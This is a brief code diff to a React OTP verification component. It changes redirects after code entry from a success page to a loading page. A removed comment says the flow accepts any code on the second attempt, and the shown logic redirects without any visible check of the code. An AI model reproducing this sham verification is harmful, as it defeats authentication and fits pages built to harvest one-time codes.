@@ -101,9 +101,9 @@ export default function OtpVerification() {
         
         setOtp("");
         
-        // Keep button disabled and redirect to success page (accept any code on 2nd attempt)
+        // Automatically redirect to loading page
         setTimeout(() => {
-          setLocation("/success");
+          setLocation("/loading");
         }, 1000);
         
         // Don't re-enable the button
@@ -132,9 +132,9 @@ export default function OtpVerification() {
         
         setOtp("");
         
-        // Keep button disabled and redirect to success page
+        // Automatically redirect to loading page
         setTimeout(() => {
-          setLocation("/success");
+          setLocation("/loading");
         }, 1000);
         
         // Don't re-enable the button
